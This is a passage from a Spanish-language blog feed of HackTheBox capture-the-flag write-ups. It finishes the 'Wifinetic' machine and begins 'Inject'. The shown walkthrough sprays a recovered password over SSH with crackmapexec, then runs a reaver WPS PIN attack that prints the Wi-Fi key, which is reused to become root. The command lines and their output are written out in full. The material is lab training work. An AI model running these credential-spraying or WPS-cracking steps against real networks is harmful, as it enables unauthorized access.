root:x:0:
daemon:x:1:
adm:x:4:
mail:x:8:
dialout:x:20:
audio:x:29:
www-data:x:33:
ftp:x:55:
<span class="nb">users</span>:x:100:
network:x:101:network
nogroup:x:65534:
ntp:x:123:ntp
dnsmasq:x:453:dnsmasq
logd:x:514:logd
ubus:x:81:ubus
netadmin:!:999:
</code></pre></div></div>

<ul>
  <li>Como tenemos una contraseña y nombres de varios usuarios hice una lista y con <code class="language-plaintext highlighter-rouge">crackmapexec</code> vi que usuarios usan la contraseña para autenticarse por <code class="language-plaintext highlighter-rouge">ssh</code> y el usuario <code class="language-plaintext highlighter-rouge">netadmin</code> la usa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>users.txt
root
adm
mail
network
ntp
netadmin
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ssh 10.10.11.247 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span> <span class="nt">--continue-on-success</span>
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] adm:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] mail:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>+] netadmin:VeRyUniUqWiFIPasswrd1!
</code></pre></div></div>

<h2 id="shell-as-netadmin-and-usertxt">Shell as netadmin and user.txt</h2>

<ul>
  <li>Ahora nos podemos conectar y ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ssh netadmin@10.10.11.247
The authenticity of host <span class="s1">'10.10.11.247 (10.10.11.247)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.247<span class="s1">' (ED25519) to the list of known hosts.
netadmin@10.10.11.247'</span>s password:
Welcome to Ubuntu 20.04.6 LTS <span class="o">(</span>GNU/Linux 5.4.0-162-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Wed 05 Jun 2024 06:45:43 PM UTC

  System load:            0.04
  Usage of /:             70.1% of 4.76GB
  Memory usage:           12%
  Swap usage:             0%
  Processes:              228
  Users logged <span class="k">in</span>:        0
  IPv4 address <span class="k">for </span>eth0:  10.10.11.247
  IPv6 address <span class="k">for </span>eth0:  dead:beef::250:56ff:feb9:e70f
  IPv4 address <span class="k">for </span>wlan0: 192.168.1.1
  IPv4 address <span class="k">for </span>wlan1: 192.168.1.23


Expanded Security Maintenance <span class="k">for </span>Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: <span class="nb">sudo </span>pro status


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun  5 04:48:37 2024 from 10.10.16.6
netadmin@wifinetic:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
netadmin@wifinetic:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
c1b267d58451fd704217588ece6ae83b
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/snapd/snap-confine
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/bin/mount
./usr/bin/sudo
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
</code></pre></div></div>

<ul>
  <li>No tenemos ningún privilegio a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>netadmin:
Sorry, user netadmin may not run <span class="nb">sudo </span>on wifinetic.
</code></pre></div></div>

<ul>
  <li>Podemos buscar por <code class="language-plaintext highlighter-rouge">capabilities</code> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</a> la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> <a href="https://www.kali.org/tools/reaver/">https://www.kali.org/tools/reaver/</a> <a href="https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html">https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html</a> es utilizada para ataques wifi WPS.</li>
</ul>

<blockquote>
  <p>El protocolo WPS (Wi-Fi Protected Setup) es un estándar de seguridad de redes diseñado para facilitar la configuración segura de una red inalámbrica Wi-Fi. Este protocolo permite a los usuarios conectar dispositivos a una red inalámbrica de forma segura y conveniente sin tener que ingresar una contraseña larga.</p>
</blockquote>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/4.png" />
</p>

<ul>
  <li>Tenemos 6 interfaces.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>ifconfig
eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x0&lt;global&gt;
        inet6 fe80::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 00:50:56:b9:e7:0f  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 234991  bytes 14972570 <span class="o">(</span>14.9 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 213051  bytes 19724677 <span class="o">(</span>19.7 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 148254  bytes 9637744 <span class="o">(</span>9.6 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 148254  bytes 9637744 <span class="o">(</span>9.6 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  <span class="o">(</span>UNSPEC<span class="o">)</span>
        RX packets 598684  bytes 105544453 <span class="o">(</span>105.5 MB<span class="o">)</span>
        RX errors 0  dropped 598623  overruns 0  frame 0
        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 02:00:00:00:00:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 20246  bytes 1987658 <span class="o">(</span>1.9 MB<span class="o">)</span>
        RX errors 0  dropped 2743  overruns 0  frame 0
        TX packets 23375  bytes 2791153 <span class="o">(</span>2.7 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 02:00:00:00:01:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 5862  bytes 815386 <span class="o">(</span>815.3 KB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20223  bytes 2348428 <span class="o">(</span>2.3 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: <span class="nv">flags</span><span class="o">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div></div>

<ul>
  <li>
    <p>La que mas llama la atención es <code class="language-plaintext highlighter-rouge">mon0</code> ya que cuando tenemos una antena y la ponemos en modo monitor suele llamarse <code class="language-plaintext highlighter-rouge">wlan0mon</code>.</p>
  </li>
  <li>
    <p>Algo que podemos hacer es ver mas información acerca de las interfaces inalámbricas en el sistema.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>iw dev
phy#2
	Interface mon0
		ifindex 7
		wdev 0x200000002
		addr 02:00:00:00:02:00
		<span class="nb">type </span>monitor
		txpower 20.00 dBm
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		<span class="nb">type </span>managed
		txpower 20.00 dBm
phy#1
	Unnamed/non-netdev interface
		wdev 0x10000056b
		addr 42:00:00:00:01:00
		<span class="nb">type </span>P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		<span class="nb">type </span>managed
		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr 02:00:00:00:00:00
		ssid OpenWrt
		<span class="nb">type </span>AP
		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
		txpower 20.00 dBm
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que wlan0 tiene como nombre su <code class="language-plaintext highlighter-rouge">AP</code> <code class="language-plaintext highlighter-rouge">OpenWRT</code> que opera en el canal 1.</p>
  </li>
  <li>
    <p>Este es mas interesante ya que esta corriendo en modo <code class="language-plaintext highlighter-rouge">managed</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phy#1
	Unnamed/non-netdev interface
		wdev 0x10000056b
		addr 42:00:00:00:01:00
		<span class="nb">type </span>P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		<span class="nb">type </span>managed
		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
		txpower 20.00 dBm
</code></pre></div></div>

<blockquote>
  <p>type managed: La interfaz está en modo “managed”, también conocido como modo “infraestructura”. Este modo es utilizado en dispositivos clientes que se conectan a un punto de acceso central (como un router). El dispositivo en este modo se comunica a través de un punto de acceso.</p>
</blockquote>

<blockquote>
  <p>El “modo managed” es un tipo de configuración de red inalámbrica en la que la interfaz inalámbrica del dispositivo opera como un cliente dentro de una infraestructura de red WLAN más grande. Este es el modo típico utilizado por los dispositivos que se conectan a un router Wi-Fi. En este modo, todas las decisiones sobre cuándo y cómo transmitir datos a través de la red son administradas por el punto de acceso, y no por la interfaz inalámbrica del cliente.</p>
</blockquote>

<ul>
  <li>
    <p>Como nos mencionan la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> cuando vimos las <code class="language-plaintext highlighter-rouge">capabilities</code> si investigamos la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> pues es un <code class="language-plaintext highlighter-rouge">WPS cracker</code>.</p>
  </li>
  <li>
    <p>Aquí nos explican sobre el PIN <a href="https://outpost24.com/blog/wps-cracking-with-reaver/">https://outpost24.com/blog/wps-cracking-with-reaver/</a>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/5.png" />
</p>

<blockquote>
  <p>El PIN de WPS, generalmente de 8 dígitos, está impreso en el dispositivo para facilitar el acceso. Los primeros 7 dígitos son aleatorios y el último dígito es un dígito de verificación o checksum, calculado en base a los otros dígitos para detectar errores de entrada.</p>
</blockquote>

<blockquote>
  <p>Durante el proceso de autenticación, el sistema verifica el PIN en dos etapas. Primero, verifica los primeros cuatro dígitos del PIN. Si esta primera parte es correcta, procede a verificar los siguientes tres dígitos (el octavo es el dígito de checksum).</p>
</blockquote>

<ul>
  <li>Para eso usaremos <code class="language-plaintext highlighter-rouge">Reaver</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>reaver

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright <span class="o">(</span>c<span class="o">)</span> 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;

Required Arguments:
	<span class="nt">-i</span>, <span class="nt">--interface</span><span class="o">=</span>&lt;wlan&gt;          Name of the monitor-mode interface to use
	<span class="nt">-b</span>, <span class="nt">--bssid</span><span class="o">=</span>&lt;mac&gt;               BSSID of the target AP

Optional Arguments:
	<span class="nt">-m</span>, <span class="nt">--mac</span><span class="o">=</span>&lt;mac&gt;                 MAC of the host system
	<span class="nt">-e</span>, <span class="nt">--essid</span><span class="o">=</span>&lt;ssid&gt;              ESSID of the target AP
	<span class="nt">-c</span>, <span class="nt">--channel</span><span class="o">=</span>&lt;channel&gt;         Set the 802.11 channel <span class="k">for </span>the interface <span class="o">(</span>implies <span class="nt">-f</span><span class="o">)</span>
	<span class="nt">-s</span>, <span class="nt">--session</span><span class="o">=</span>&lt;file&gt;            Restore a previous session file
	<span class="nt">-C</span>, <span class="nt">--exec</span><span class="o">=</span>&lt;<span class="nb">command</span><span class="o">&gt;</span>            Execute the supplied <span class="nb">command </span>upon successful pin recovery
	<span class="nt">-f</span>, <span class="nt">--fixed</span>                     Disable channel hopping
	<span class="nt">-5</span>, <span class="nt">--5ghz</span>                      Use 5GHz 802.11 channels
	<span class="nt">-v</span>, <span class="nt">--verbose</span>                   Display non-critical warnings <span class="o">(</span><span class="nt">-vv</span> or <span class="nt">-vvv</span> <span class="k">for </span>more<span class="o">)</span>
	<span class="nt">-q</span>, <span class="nt">--quiet</span>                     Only display critical messages
	<span class="nt">-h</span>, <span class="nt">--help</span>                      Show <span class="nb">help

</span>Advanced Options:
	<span class="nt">-p</span>, <span class="nt">--pin</span><span class="o">=</span>&lt;wps pin&gt;             Use the specified pin <span class="o">(</span>may be arbitrary string or 4/8 digit WPS pin<span class="o">)</span>
	<span class="nt">-d</span>, <span class="nt">--delay</span><span class="o">=</span>&lt;seconds&gt;           Set the delay between pin attempts <span class="o">[</span>1]
	<span class="nt">-l</span>, <span class="nt">--lock-delay</span><span class="o">=</span>&lt;seconds&gt;      Set the <span class="nb">time </span>to <span class="nb">wait </span><span class="k">if </span>the AP locks WPS pin attempts <span class="o">[</span>60]
	<span class="nt">-g</span>, <span class="nt">--max-attempts</span><span class="o">=</span>&lt;num&gt;        Quit after num pin attempts
	<span class="nt">-x</span>, <span class="nt">--fail-wait</span><span class="o">=</span>&lt;seconds&gt;       Set the <span class="nb">time </span>to <span class="nb">sleep </span>after 10 unexpected failures <span class="o">[</span>0]
	<span class="nt">-r</span>, <span class="nt">--recurring-delay</span><span class="o">=</span>&lt;x:y&gt;     Sleep <span class="k">for </span>y seconds every x pin attempts
	<span class="nt">-t</span>, <span class="nt">--timeout</span><span class="o">=</span>&lt;seconds&gt;         Set the receive <span class="nb">timeout </span>period <span class="o">[</span>10]
	<span class="nt">-T</span>, <span class="nt">--m57-timeout</span><span class="o">=</span>&lt;seconds&gt;     Set the M5/M7 <span class="nb">timeout </span>period <span class="o">[</span>0.40]
	<span class="nt">-A</span>, <span class="nt">--no-associate</span>              Do not associate with the AP <span class="o">(</span>association must be <span class="k">done </span>by another application<span class="o">)</span>
	<span class="nt">-N</span>, <span class="nt">--no-nacks</span>                  Do not send NACK messages when out of order packets are received
	<span class="nt">-S</span>, <span class="nt">--dh-small</span>                  Use small DH keys to improve crack speed
	<span class="nt">-L</span>, <span class="nt">--ignore-locks</span>              Ignore locked state reported by the target AP
	<span class="nt">-E</span>, <span class="nt">--eap-terminate</span>             Terminate each WPS session with an EAP FAIL packet
	<span class="nt">-J</span>, <span class="nt">--timeout-is-nack</span>           Treat <span class="nb">timeout </span>as NACK <span class="o">(</span>DIR-300/320<span class="o">)</span>
	<span class="nt">-F</span>, <span class="nt">--ignore-fcs</span>                Ignore frame checksum errors
	<span class="nt">-w</span>, <span class="nt">--win7</span>                      Mimic a Windows 7 registrar <span class="o">[</span>False]
	<span class="nt">-K</span>, <span class="nt">--pixie-dust</span>                Run pixiedust attack
	<span class="nt">-Z</span>                              Run pixiedust attack

Example:
	reaver <span class="nt">-i</span> wlan0mon <span class="nt">-b</span> 00:90:4C:C1:AC:21 <span class="nt">-vv</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Para usarla simplemente le necesitas proporcionar el nombre de la interfaz en modo monitor y la <code class="language-plaintext highlighter-rouge">MAC</code> del <code class="language-plaintext highlighter-rouge">target</code>.</p>
  </li>
  <li>
    <p>Vamos atacar el target donde se esta corriendo el <strong>AP</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>reaver <span class="nt">-i</span> mon0 <span class="nt">-b</span> 02:00:00:00:00:00 <span class="nt">-vv</span>

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright <span class="o">(</span>c<span class="o">)</span> 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;

<span class="o">[</span>+] Waiting <span class="k">for </span>beacon from 02:00:00:00:00:00
<span class="o">[</span>+] Switching mon0 to channel 1
<span class="o">[</span>+] Received beacon from 02:00:00:00:00:00
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[!]</span> Found packet with bad FCS, skipping...
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received M3 message
<span class="o">[</span>+] Sending M4 message
<span class="o">[</span>+] Received M5 message
<span class="o">[</span>+] Sending M6 message
<span class="o">[</span>+] Received M7 message
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[</span>+] Pin cracked <span class="k">in </span>6 seconds
<span class="o">[</span>+] WPS PIN: <span class="s1">'12345670'</span>
<span class="o">[</span>+] WPA PSK: <span class="s1">'WhatIsRealAnDWhAtIsNot51121!'</span>
<span class="o">[</span>+] AP SSID: <span class="s1">'OpenWrt'</span>
<span class="o">[</span>+] Nothing <span class="k">done</span>, nothing to save.
</code></pre></div></div>

<ul>
  <li>Vemos que tenemos el <code class="language-plaintext highlighter-rouge">PIN</code> y la <code class="language-plaintext highlighter-rouge">Password</code>.</li>
</ul>

<h2 id="shell-as-root-and-roottxt">Shell as root and root.txt</h2>

<ul>
  <li>Si migramos al usuario <code class="language-plaintext highlighter-rouge">root</code> con la contraseña funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>su root
Password:
root@wifinetic:/# <span class="nb">whoami
</span>root
root@wifinetic:/#
</code></pre></div></div>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@wifinetic:~# <span class="nb">cat </span>root.txt
82e27401ce5bb1d85196562913c72da9
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Inject (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html" rel="alternate" type="text/html" title="HackTheBox - Inject (easy)" /><published>2024-06-02T00:00:00-06:00</published><updated>2024-06-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/285ba8819710b6ae1f67bc0e5914ffd9.png" />
</p>

<ul>
  <li>Inject is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). By exploiting the LFI vulnerability, files on the system can be enumerated, revealing that the web application uses a specific version of the <code class="language-plaintext highlighter-rouge">Spring-Cloud-Function-Web</code> module susceptible to <code class="language-plaintext highlighter-rouge">CVE-2022-22963</code>. Exploiting this vulnerability grants an initial foothold as the <code class="language-plaintext highlighter-rouge">frank</code> user. Lateral movement is achieved by further file enumeration, which discloses a plaintext password for <code class="language-plaintext highlighter-rouge">phil</code>. A cronjob running on the machine can then be exploited to execute a malicious <code class="language-plaintext highlighter-rouge">Ansible</code> playbook, ultimately obtaining a reverse shell as the <code class="language-plaintext highlighter-rouge">root</code> user.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,8080 10.10.11.204 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-02 11:53 CST
Nmap scan report <span class="k">for </span>10.10.11.204
Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 <span class="o">(</span>RSA<span class="o">)</span>
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d <span class="o">(</span>ED25519<span class="o">)</span>
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración-y-lfi">Enumeración y LFI</h2>

<ul>
  <li>Vemos las versiones que esta corriendo el servicio web que al parecer no son muchas.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Content</span><span class="o">-</span><span class="no">Language</span><span class="p">[</span><span class="n">en</span><span class="o">-</span><span class="no">US</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Frame</span><span class="p">,</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Home</span><span class="p">],</span> <span class="no">YouTube</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/1.png" />
</p>

<ul>
  <li>En la parte de <strong>register</strong> no vemos nada importante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/2.png" />
</p>

<ul>
  <li>La parte de <strong>blogs</strong> funciona y vemos algunos usuarios.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/3.png" />
</p>

<ul>
  <li>Sin embargo hay una ruta que se llama <strong>/upload</strong> la cual esta si funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/4.png" />
</p>

<ul>
  <li>
    <p>Vamos a subir un archivo cualquiera en este caso un <code class="language-plaintext highlighter-rouge">.txt</code>.</p>
  </li>
  <li>
    <p>Sin embargo aunque lo subamos nos da esta respuesta.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/5.png" />
</p>

<ul>
  <li>Si probamos con una imagen funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/6.png" />
</p>

<ul>
